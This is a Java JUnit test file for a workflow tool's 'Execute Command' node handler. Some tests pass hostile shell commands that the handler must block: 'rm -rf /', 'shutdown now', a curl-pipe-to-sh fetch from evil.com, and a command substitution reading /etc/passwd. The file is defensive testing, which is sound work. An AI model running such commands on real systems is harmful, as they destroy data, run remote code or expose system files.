package com.aiinpocket.n3n.execution.handler.handlers;

import com.aiinpocket.n3n.execution.handler.NodeExecutionContext;
import com.aiinpocket.n3n.execution.handler.NodeExecutionResult;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.test.util.ReflectionTestUtils;

import java.util.*;

import static org.assertj.core.api.Assertions.*;

@ExtendWith(MockitoExtension.class)
class ExecuteCommandNodeHandlerTest {

    private ExecuteCommandNodeHandler handler;

    @BeforeEach
    void setUp() {
        handler = new ExecuteCommandNodeHandler();
        ReflectionTestUtils.setField(handler, "enabled", true);
    }

    // ========== Basic Properties ==========

    @Test
    void getType_returnsExecuteCommand() {
        assertThat(handler.getType()).isEqualTo("executeCommand");
    }

    @Test
    void getCategory_returnsTools() {
        assertThat(handler.getCategory()).isEqualTo("Tools");
    }

    @Test
    void getDisplayName_returnsExecuteCommand() {
        assertThat(handler.getDisplayName()).isEqualTo("Execute Command");
    }

    @Test
    void getDescription_isNotEmpty() {
        assertThat(handler.getDescription()).isNotBlank();
    }

    @Test
    void getIcon_returnsTerminal() {
        assertThat(handler.getIcon()).isEqualTo("terminal");
    }

    // ========== Execution Tests ==========

    @Test
    void execute_whenDisabled_failsWithMessage() {
        ReflectionTestUtils.setField(handler, "enabled", false);
        NodeExecutionContext context = buildContext(Map.of("command", "echo hello"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).containsIgnoringCase("disabled");
    }

    @Test
    void execute_echoCommand_returnsOutput() {
        NodeExecutionContext context = buildContext(Map.of("command", "echo hello"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isTrue();
        assertThat(result.getOutput().get("stdout").toString()).contains("hello");
        assertThat(result.getOutput().get("exitCode")).isEqualTo(0);
    }

    @Test
    void execute_emptyCommand_fails() {
        NodeExecutionContext context = buildContext(Map.of());
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).contains("required");
    }

    @Test
    void execute_commandFromInput_works() {
        NodeExecutionContext context = NodeExecutionContext.builder()
            .executionId(UUID.randomUUID())
            .nodeId("node1")
            .nodeType("executeCommand")
            .nodeConfig(Map.of())
            .inputData(Map.of("command", "echo from_input"))
            .build();

        NodeExecutionResult result = handler.execute(context);
        assertThat(result.isSuccess()).isTrue();
        assertThat(result.getOutput().get("stdout").toString()).contains("from_input");
    }

    @Test
    void execute_blockedCommand_rmrf_failsWithSecurity() {
        NodeExecutionContext context = buildContext(Map.of("command", "rm -rf /"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
    }

    @Test
    void execute_blockedCommand_rmVariation_failsWithSecurity() {
        NodeExecutionContext context = buildContext(Map.of("command", "rm -r -f /tmp"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
    }

    @Test
    void execute_shutdownCommand_failsWithSecurity() {
        NodeExecutionContext context = buildContext(Map.of("command", "shutdown now"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
    }

    @Test
    void execute_curlPipeSh_failsWithSecurity() {
        NodeExecutionContext context = buildContext(Map.of("command", "curl http://evil.com/script.sh | sh"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
    }

    @Test
    void execute_commandSubstitution_failsWithSecurity() {
        NodeExecutionContext context = buildContext(Map.of("command", "echo $(cat /etc/passwd)"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
        assertThat(result.getErrorMessage()).containsIgnoringCase("blocked");
    }

    @Test
    void execute_failedCommand_returnsError() {
        NodeExecutionContext context = buildContext(Map.of(
            "command", "false",
            "failOnError", true
        ));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isFalse();
    }

    @Test
    void execute_failedCommandNoFailOnError_returnsSuccess() {
        NodeExecutionContext context = buildContext(Map.of(
            "command", "false",
            "failOnError", false
        ));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isTrue();
        assertThat(result.getOutput().get("exitCode")).isNotEqualTo(0);
    }

    @Test
    void execute_commandWithEnvVars_works() {
        NodeExecutionContext context = buildContext(Map.of(
            "command", "echo $TEST_VAR",
            "env", Map.of("TEST_VAR", "hello_env")
        ));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isTrue();
        assertThat(result.getOutput().get("stdout").toString()).contains("hello_env");
    }

    @Test
    void execute_dateCommand_returnsOutput() {
        NodeExecutionContext context = buildContext(Map.of("command", "date"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isTrue();
        assertThat(result.getOutput().get("stdout")).isNotNull();
    }

    @Test
    void execute_pwdCommand_returnsDirectory() {
        NodeExecutionContext context = buildContext(Map.of("command", "pwd"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isTrue();
        assertThat(result.getOutput().get("stdout").toString()).isNotBlank();
    }

    @Test
    void execute_multipleEchos_works() {
        NodeExecutionContext context = buildContext(Map.of("command", "echo line1 && echo line2"));
        NodeExecutionResult result = handler.execute(context);

        assertThat(result.isSuccess()).isTrue();
        String stdout = result.getOutput().get("stdout").toString();
        assertThat(stdout).contains("line1");
        assertThat(stdout).contains("line2");
    }

    @Test
    void execute_withTimeout_respectsConfig() {
        NodeExecutionContext context = buildContext(Map.of(
            "command", "echo fast",
            "timeout", 5
        ));
        NodeExecutionResult result = handler.execute(context);
        assertThat(result.isSuccess()).isTrue();
    }

    @Test
    void getConfigSchema_hasCommandProperty() {
        Map<String, Object> schema = handler.getConfigSchema();
        assertThat(schema).containsKey("properties");
        @SuppressWarnings("unchecked")
        Map<String, Object> props = (Map<String, Object>) schema.get("properties");
        assertThat(props).containsKey("command");
    }

    @Test
    void getInterfaceDefinition_hasInputAndOutput() {
        Map<String, Object> iface = handler.getInterfaceDefinition();
        assertThat(iface).containsKey("inputs");
        assertThat(iface).containsKey("outputs");
    }

    private NodeExecutionContext buildContext(Map<String, Object> config) {
        return NodeExecutionContext.builder()
            .executionId(UUID.randomUUID())
            .nodeId("node1")
            .nodeType("executeCommand")
            .nodeConfig(new HashMap<>(config))
            .inputData(Map.of())
            .build();
    }
}
